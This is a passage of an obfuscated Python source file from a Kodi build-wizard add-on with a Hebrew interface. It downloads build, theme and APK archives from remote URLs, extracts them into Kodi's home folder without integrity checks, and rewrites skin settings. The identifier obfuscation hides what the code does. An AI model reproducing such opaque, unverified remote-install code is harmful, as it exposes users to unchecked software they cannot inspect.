			elif INSTALLMETHOD ==2 :OO0OO00OO0O0OOOOO =0 #line:3784
			else :DP .close ()#line:3785
		else :#line:3787
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3788
	elif O000OO0O0O00O0O0O =='fresh':#line:3789
		freshStart (OOO0OO000O000O0OO )#line:3790
	elif O000OO0O0O00O0O0O =='normal':#line:3791
		if url =='normal':#line:3792
			if KEEPTRAKT =='true':#line:3793
				traktit .autoUpdate ('all')#line:3794
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3795
			if KEEPREAL =='true':#line:3796
				debridit .autoUpdate ('all')#line:3797
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3798
			if KEEPLOGIN =='true':#line:3799
				loginit .autoUpdate ('all')#line:3800
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3801
		OO0O00O0OOOO000O0 =int (KODIV );O00OOOO000O0OOOO0 =int (float (wiz .checkBuild (OOO0OO000O000O0OO ,'kodi')))#line:3802
		if not OO0O00O0OOOO000O0 ==O00OOOO000O0OOOO0 :#line:3803
			if OO0O00O0OOOO000O0 ==16 and O00OOOO000O0OOOO0 <=15 :OO000000000OOO000 =False #line:3804
			else :OO000000000OOO000 =True #line:3805
		else :OO000000000OOO000 =False #line:3806
		if OO000000000OOO000 ==True :#line:3807
			OO00O0OO000OOOOOO =1 #line:3808
		else :#line:3809
			if not over ==False :OO00O0OO000OOOOOO =1 #line:3810
			else :OO00O0OO000OOOOOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3811
		if OO00O0OO000OOOOOO :#line:3812
			wiz .clearS ('build')#line:3813
			O0OOO00OOOOOO0000 =wiz .checkBuild (OOO0OO000O000O0OO ,'url')#line:3814
			OO000OOOOO000OO00 =OOO0OO000O000O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3815
			if not wiz .workingURL (O0OOO00OOOOOO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3816
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3817
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO000O000O0OO ,wiz .checkBuild (OOO0OO000O000O0OO ,'version')),'','אנא המתן')#line:3818
			OOO000OO000000O00 =os .path .join (PACKAGES ,'%s.zip'%OO000OOOOO000OO00 )#line:3819
			try :os .remove (OOO000OO000000O00 )#line:3820
			except :pass #line:3821
			logging .warning (O0OOO00OOOOOO0000 )#line:3822
			if 'google'in O0OOO00OOOOOO0000 :#line:3823
			   OO00000000O0O0OOO =googledrive_download (O0OOO00OOOOOO0000 ,OOO000OO000000O00 ,DP ,wiz .checkBuild (OOO0OO000O000O0OO ,'filesize'))#line:3824
			else :#line:3827
			  downloader .download (O0OOO00OOOOOO0000 ,OOO000OO000000O00 ,DP )#line:3828
			xbmc .sleep (1000 )#line:3829
			OOOOO0OO000OO0O00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO000O000O0OO ,wiz .checkBuild (OOO0OO000O000O0OO ,'version'))#line:3830
			DP .update (0 ,OOOOO0OO000OO0O00 ,'','Please Wait')#line:3831
			OOOO000OO00000O00 ,O00OOOO00OOOOO000 ,O0O0O000OOOOO0OOO =extract .all (OOO000OO000000O00 ,HOME ,DP ,title =OOOOO0OO000OO0O00 )#line:3832
			if int (float (OOOO000OO00000O00 ))>0 :#line:3833
				wiz .fixmetas ()#line:3834
				wiz .lookandFeelData ('save')#line:3835
				wiz .defaultSkin ()#line:3836
				wiz .setS ('buildname',OOO0OO000O000O0OO )#line:3838
				wiz .setS ('buildversion',wiz .checkBuild (OOO0OO000O000O0OO ,'version'))#line:3839
				wiz .setS ('buildtheme','')#line:3840
				wiz .setS ('latestversion',wiz .checkBuild (OOO0OO000O000O0OO ,'version'))#line:3841
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3842
				wiz .setS ('installed','true')#line:3843
				wiz .setS ('extract',str (OOOO000OO00000O00 ))#line:3844
				wiz .setS ('errors',str (O00OOOO00OOOOO000 ))#line:3845
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOO000OO00000O00 ,O00OOOO00OOOOO000 ))#line:3846
				OO00OO000OOOOO00O =(ADDON .getSetting ("gaiaseren"))#line:3848
				if OO00OO000OOOOO00O =='true':#line:3849
					wiz .kodi17Fix ()#line:3850
				fastupdatefirstbuild (NOTEID )#line:3851
				skin_homeselect ()#line:3852
				skin_lower ()#line:3853
				rdbuildinstall ()#line:3854
				try :gaiaserenaddon ()#line:3856
				except :pass #line:3857
				adults18 ()#line:3858
				skinfix18 ()#line:3859
				try :os .remove (OOO000OO000000O00 )#line:3861
				except :pass #line:3862
				if OO00OO000OOOOO00O =='true':#line:3864
					wiz .kodi17Fix ()#line:3865
				O000OO00O00O0O0OO =(ADDON .getSetting ("auto_rd"))#line:3867
				if O000OO00O00O0O0OO =='true':#line:3868
					try :#line:3869
						setautorealdebrid ()#line:3870
					except :pass #line:3871
				if int (float (O00OOOO00OOOOO000 ))>0 :#line:3873
					OO0OO00OOO0000OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO000O000O0OO ,wiz .checkBuild (OOO0OO000O000O0OO ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOO000OO00000O00 ,'%',COLOR1 ,O00OOOO00OOOOO000 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3874
					if OO0OO00OOO0000OOO :#line:3875
						if isinstance (O00OOOO00OOOOO000 ,unicode ):#line:3876
							O0O0O000OOOOO0OOO =O0O0O000OOOOO0OOO .encode ('utf-8')#line:3877
						wiz .TextBox (ADDONTITLE ,O0O0O000OOOOO0OOO )#line:3878
				DP .close ()#line:3879
				OOOO000000O0000OO =wiz .themeCount (OOO0OO000O000O0OO )#line:3880
				indicator ()#line:3881
				if not OOOO000000O0000OO ==False :#line:3882
					buildWizard (OOO0OO000O000O0OO ,'theme')#line:3883
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3884
				if INSTALLMETHOD ==1 :OO0OO00OO0O0OOOOO =1 #line:3885
				elif INSTALLMETHOD ==2 :OO0OO00OO0O0OOOOO =0 #line:3886
				else :resetkodi ()#line:3887
				if OO0OO00OO0O0OOOOO ==1 :wiz .reloadFix ()#line:3889
				else :wiz .killxbmc (True )#line:3890
			else :#line:3891
				if isinstance (O00OOOO00OOOOO000 ,unicode ):#line:3892
					O0O0O000OOOOO0OOO =O0O0O000OOOOO0OOO .encode ('utf-8')#line:3893
				O0OOOOO0O0OOOO000 =open (OOO000OO000000O00 ,'r')#line:3894
				O000O0OOO0OOO0O0O =O0OOOOO0O0OOOO000 .read ()#line:3895
				OOO0OO0O00OO0O000 =''#line:3896
				for O0O0OOO0OO0O000O0 in OO00000000O0O0OOO :#line:3897
				  OOO0OO0O00OO0O000 ='key: '+OOO0OO0O00OO0O000 +'\n'+O0O0OOO0OO0O000O0 #line:3898
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O0O000OOOOO0OOO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOO0OO0O00OO0O000 )#line:3899
		else :#line:3900
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3901
	elif O000OO0O0O00O0O0O =='theme':#line:3902
		if theme ==None :#line:3903
			OOOO000000O0000OO =wiz .checkBuild (OOO0OO000O000O0OO ,'theme')#line:3904
			O00000OO0000O00O0 =[]#line:3905
			if not OOOO000000O0000OO =='http://'and wiz .workingURL (OOOO000000O0000OO )==True :#line:3906
				O00000OO0000O00O0 =wiz .themeCount (OOO0OO000O000O0OO ,False )#line:3907
				if len (O00000OO0000O00O0 )>0 :#line:3908
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOO0OO000O000O0OO ,COLOR1 ,len (O00000OO0000O00O0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3909
						wiz .log ("Theme List: %s "%str (O00000OO0000O00O0 ))#line:3910
						O00OOO0O0OOOO0OO0 =DIALOG .select (ADDONTITLE ,O00000OO0000O00O0 )#line:3911
						wiz .log ("Theme install selected: %s"%O00OOO0O0OOOO0OO0 )#line:3912
						if not O00OOO0O0OOOO0OO0 ==-1 :theme =O00000OO0000O00O0 [O00OOO0O0OOOO0OO0 ];O0OOOOO00OOOO0O0O =True #line:3913
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3914
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3915
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3916
		else :O0OOOOO00OOOO0O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOO0OO000O000O0OO ,wiz .checkBuild (OOO0OO000O000O0OO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3917
		if O0OOOOO00OOOO0O0O :#line:3918
			O00OOOO0OOOO0O00O =wiz .checkTheme (OOO0OO000O000O0OO ,theme ,'url')#line:3919
			OO000OOOOO000OO00 =OOO0OO000O000O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3920
			if not wiz .workingURL (O00OOOO0OOOO0O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3921
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3922
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3923
			OOO000OO000000O00 =os .path .join (PACKAGES ,'%s.zip'%OO000OOOOO000OO00 )#line:3924
			try :os .remove (OOO000OO000000O00 )#line:3925
			except :pass #line:3926
			downloader .download (O00OOOO0OOOO0O00O ,OOO000OO000000O00 ,DP )#line:3927
			xbmc .sleep (1000 )#line:3928
			DP .update (0 ,"","Installing %s "%OOO0OO000O000O0OO )#line:3929
			O0OO0OOO0O0O0000O =False #line:3930
			if url not in ["fresh","normal"]:#line:3931
				O0OO0OOO0O0O0000O =testTheme (OOO000OO000000O00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3932
				OOOOOOOOOO0OO0O00 =testGui (OOO000OO000000O00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3933
				if O0OO0OOO0O0O0000O ==True :#line:3934
					wiz .lookandFeelData ('save')#line:3935
					O00OOO0OO0OO00O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3936
					OO0OOO00O0OOO00OO =xbmc .getSkinDir ()#line:3937
					skinSwitch .swapSkins (O00OOO0OO0OO00O00 )#line:3939
					O0O0O00OO0000OOO0 =0 #line:3940
					xbmc .sleep (1000 )#line:3941
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O00OO0000OOO0 <150 :#line:3942
						O0O0O00OO0000OOO0 +=1 #line:3943
						xbmc .sleep (1000 )#line:3944
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3945
						wiz .ebi ('SendClick(11)')#line:3946
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3947
					xbmc .sleep (1000 )#line:3948
			OOOOO0OO000OO0O00 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3949
			DP .update (0 ,OOOOO0OO000OO0O00 ,'','אנא המתן')#line:3950
			OOOO000OO00000O00 ,O00OOOO00OOOOO000 ,O0O0O000OOOOO0OOO =extract .all (OOO000OO000000O00 ,HOME ,DP ,title =OOOOO0OO000OO0O00 )#line:3951
			wiz .setS ('buildtheme',theme )#line:3952
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOOO000OO00000O00 ,O00OOOO00OOOOO000 ))#line:3953
			DP .close ()#line:3954
			if url not in ["fresh","normal"]:#line:3955
				wiz .forceUpdate ()#line:3956
				if KODIV >=17 :wiz .kodi17Fix ()#line:3957
				if OOOOOOOOOO0OO0O00 ==True :#line:3958
					wiz .lookandFeelData ('save')#line:3959
					wiz .defaultSkin ()#line:3960
					OO0OOO00O0OOO00OO =wiz .getS ('defaultskin')#line:3961
					skinSwitch .swapSkins (OO0OOO00O0OOO00OO )#line:3962
					O0O0O00OO0000OOO0 =0 #line:3963
					xbmc .sleep (1000 )#line:3964
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O00OO0000OOO0 <150 :#line:3965
						O0O0O00OO0000OOO0 +=1 #line:3966
						xbmc .sleep (1000 )#line:3967
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3969
						wiz .ebi ('SendClick(11)')#line:3970
					wiz .lookandFeelData ('restore')#line:3971
				elif O0OO0OOO0O0O0000O ==True :#line:3972
					skinSwitch .swapSkins (OO0OOO00O0OOO00OO )#line:3973
					O0O0O00OO0000OOO0 =0 #line:3974
					xbmc .sleep (1000 )#line:3975
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O00OO0000OOO0 <150 :#line:3976
						O0O0O00OO0000OOO0 +=1 #line:3977
						xbmc .sleep (1000 )#line:3978
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3980
						wiz .ebi ('SendClick(11)')#line:3981
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3982
					wiz .lookandFeelData ('restore')#line:3983
				else :#line:3984
					wiz .ebi ("ReloadSkin()")#line:3985
					xbmc .sleep (1000 )#line:3986
					wiz .ebi ("Container.Refresh")#line:3987
		else :#line:3988
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3989
def skin_homeselect ():#line:3993
	try :#line:3995
		O0OO0OOO00OO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3996
		OO0O00OOOOOO0O0O0 =open (O0OO0OOO00OO00O0O ,'r')#line:3998
		OO0O0O0O00OOOO0O0 =OO0O00OOOOOO0O0O0 .read ()#line:3999
		OO0O00OOOOOO0O0O0 .close ()#line:4000
		O0000OOO0OO00O0O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4001
		OO00OOOO0O0O0O000 =re .compile (O0000OOO0OO00O0O0 ).findall (OO0O0O0O00OOOO0O0 )[0 ]#line:4002
		OO0O00OOOOOO0O0O0 =open (O0OO0OOO00OO00O0O ,'w')#line:4003
		OO0O00OOOOOO0O0O0 .write (OO0O0O0O00OOOO0O0 .replace ('<setting id="HomeS" type="string%s/setting>'%OO00OOOO0O0O0O000 ,'<setting id="HomeS" type="string"></setting>'))#line:4004
		OO0O00OOOOOO0O0O0 .close ()#line:4005
	except :#line:4006
		pass #line:4007
def skin_lower ():#line:4010
	OO0O00O00O000O0O0 =(ADDON .getSetting ("lower"))#line:4011
	if OO0O00O00O000O0O0 =='true':#line:4012
		try :#line:4015
			OO000OOOO0OOOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4016
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'r')#line:4018
			O0OO0OO0OOOO0OOO0 =OOO000O0000OO0O00 .read ()#line:4019
			OOO000O0000OO0O00 .close ()#line:4020
			OOO0O0O00OO000O0O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4021
			OOOOOOOOOOO000OO0 =re .compile (OOO0O0O00OO000O0O ).findall (O0OO0OO0OOOO0OOO0 )[0 ]#line:4022
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'w')#line:4023
			OOO000O0000OO0O00 .write (O0OO0OO0OOOO0OOO0 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOOOOOOOOOO000OO0 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4024
			OOO000O0000OO0O00 .close ()#line:4025
			OO000OOOO0OOOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4027
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'r')#line:4029
			O0OO0OO0OOOO0OOO0 =OOO000O0000OO0O00 .read ()#line:4030
			OOO000O0000OO0O00 .close ()#line:4031
			OOO0O0O00OO000O0O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4032
			OOOOOOOOOOO000OO0 =re .compile (OOO0O0O00OO000O0O ).findall (O0OO0OO0OOOO0OOO0 )[0 ]#line:4033
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'w')#line:4034
			OOO000O0000OO0O00 .write (O0OO0OO0OOOO0OOO0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOOOOOOOOOO000OO0 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4035
			OOO000O0000OO0O00 .close ()#line:4036
			OO000OOOO0OOOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4038
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'r')#line:4040
			O0OO0OO0OOOO0OOO0 =OOO000O0000OO0O00 .read ()#line:4041
			OOO000O0000OO0O00 .close ()#line:4042
			OOO0O0O00OO000O0O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4043
			OOOOOOOOOOO000OO0 =re .compile (OOO0O0O00OO000O0O ).findall (O0OO0OO0OOOO0OOO0 )[0 ]#line:4044
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'w')#line:4045
			OOO000O0000OO0O00 .write (O0OO0OO0OOOO0OOO0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOOOOOOOOOO000OO0 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4046
			OOO000O0000OO0O00 .close ()#line:4047
			OO000OOOO0OOOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4051
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'r')#line:4053
			O0OO0OO0OOOO0OOO0 =OOO000O0000OO0O00 .read ()#line:4054
			OOO000O0000OO0O00 .close ()#line:4055
			OOO0O0O00OO000O0O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4056
			OOOOOOOOOOO000OO0 =re .compile (OOO0O0O00OO000O0O ).findall (O0OO0OO0OOOO0OOO0 )[0 ]#line:4057
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'w')#line:4058
			OOO000O0000OO0O00 .write (O0OO0OO0OOOO0OOO0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOOOOOOOOOO000OO0 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4059
			OOO000O0000OO0O00 .close ()#line:4060
			OO000OOOO0OOOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4064
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'r')#line:4066
			O0OO0OO0OOOO0OOO0 =OOO000O0000OO0O00 .read ()#line:4067
			OOO000O0000OO0O00 .close ()#line:4068
			OOO0O0O00OO000O0O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4069
			OOOOOOOOOOO000OO0 =re .compile (OOO0O0O00OO000O0O ).findall (O0OO0OO0OOOO0OOO0 )[0 ]#line:4070
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'w')#line:4071
			OOO000O0000OO0O00 .write (O0OO0OO0OOOO0OOO0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOOOOOOOOOO000OO0 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4072
			OOO000O0000OO0O00 .close ()#line:4073
			OO000OOOO0OOOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4077
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'r')#line:4079
			O0OO0OO0OOOO0OOO0 =OOO000O0000OO0O00 .read ()#line:4080
			OOO000O0000OO0O00 .close ()#line:4081
			OOO0O0O00OO000O0O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4082
			OOOOOOOOOOO000OO0 =re .compile (OOO0O0O00OO000O0O ).findall (O0OO0OO0OOOO0OOO0 )[0 ]#line:4083
			OOO000O0000OO0O00 =open (OO000OOOO0OOOOO00 ,'w')#line:4084
			OOO000O0000OO0O00 .write (O0OO0OO0OOOO0OOO0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOOOOOOOOOO000OO0 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4085
			OOO000O0000OO0O00 .close ()#line:4086
		except :#line:4091
			pass #line:4092
def thirdPartyInstall (O000000OOO0OOO00O ,OO000O00OOO00OO0O ):#line:4094
	if not wiz .workingURL (OO000O00OOO00OO0O ):#line:4095
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4096
	OO0O0000O000O0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000OOO0OOO00O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4097
	if OO0O0000O000O0OO0 ==1 :#line:4098
		freshStart ('third',True )#line:4099
	wiz .clearS ('build')#line:4100
	O000O00OO0OOO0OOO =O000000OOO0OOO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4101
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4102
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000OOO0OOO00O ),'','אנא המתן')#line:4103
	O000000OO000O0OO0 =os .path .join (PACKAGES ,'%s.zip'%O000O00OO0OOO0OOO )#line:4104
	try :os .remove (O000000OO000O0OO0 )#line:4105
	except :pass #line:4106
	downloader .download (OO000O00OOO00OO0O ,O000000OO000O0OO0 ,DP )#line:4107
	xbmc .sleep (1000 )#line:4108
	OOO0000OOO000OO0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000OOO0OOO00O )#line:4109
	DP .update (0 ,OOO0000OOO000OO0O ,'','אנא המתן')#line:4110
	O000O0OOO0000O0OO ,OO00O00OOOOO00OOO ,O00000OO0000O0OO0 =extract .all (O000000OO000O0OO0 ,HOME ,DP ,title =OOO0000OOO000OO0O )#line:4111
	if int (float (O000O0OOO0000O0OO ))>0 :#line:4112
		wiz .fixmetas ()#line:4113
		wiz .lookandFeelData ('save')#line:4114
		wiz .defaultSkin ()#line:4115
		wiz .setS ('installed','true')#line:4117
		wiz .setS ('extract',str (O000O0OOO0000O0OO ))#line:4118
		wiz .setS ('errors',str (OO00O00OOOOO00OOO ))#line:4119
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O000O0OOO0000O0OO ,OO00O00OOOOO00OOO ))#line:4120
		try :os .remove (O000000OO000O0OO0 )#line:4121
		except :pass #line:4122
		if int (float (OO00O00OOOOO00OOO ))>0 :#line:4123
			OOOO00000OOOOOOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000OOO0OOO00O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O000O0OOO0000O0OO ,'%',COLOR1 ,OO00O00OOOOO00OOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4124
			if OOOO00000OOOOOOOO :#line:4125
				if isinstance (OO00O00OOOOO00OOO ,unicode ):#line:4126
					O00000OO0000O0OO0 =O00000OO0000O0OO0 .encode ('utf-8')#line:4127
				wiz .TextBox (ADDONTITLE ,O00000OO0000O0OO0 )#line:4128
	DP .close ()#line:4129
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4130
	if INSTALLMETHOD ==1 :OO0O0OOOO000O000O =1 #line:4131
	elif INSTALLMETHOD ==2 :OO0O0OOOO000O000O =0 #line:4132
	else :OO0O0OOOO000O000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4133
	if OO0O0OOOO000O000O ==1 :wiz .reloadFix ()#line:4134
	else :wiz .killxbmc (True )#line:4135
def testTheme (O00O00O0O000OOOOO ):#line:4137
	O0OOOO0000OO0OO0O =zipfile .ZipFile (O00O00O0O000OOOOO )#line:4138
	for OO00OOOO0OOOO0O0O in O0OOOO0000OO0OO0O .infolist ():#line:4139
		if '/settings.xml'in OO00OOOO0OOOO0O0O .filename :#line:4140
			return True #line:4141
	return False #line:4142
def testGui (O000O0OO0O0000OO0 ):#line:4144
	O000000O0O000O0O0 =zipfile .ZipFile (O000O0OO0O0000OO0 )#line:4145
	for O0O00OO0O0O000OOO in O000000O0O000O0O0 .infolist ():#line:4146
		if '/guisettings.xml'in O0O00OO0O0O000OOO .filename :#line:4147
			return True #line:4148
	return False #line:4149
def apkInstaller (OOOOO0OO0OOOO0OO0 ,O00OOO00O00OO0O00 ):#line:4151
	wiz .log (OOOOO0OO0OOOO0OO0 )#line:4152
	wiz .log (O00OOO00O00OO0O00 )#line:4153
	if wiz .platform ()=='android':#line:4154
		OO00OO0000OO00OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO0OO0OOOO0OO0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4155
		if not OO00OO0000OO00OO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4156
		OOO0O000OOO00OO00 =OOOOO0OO0OOOO0OO0 #line:4157
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4158
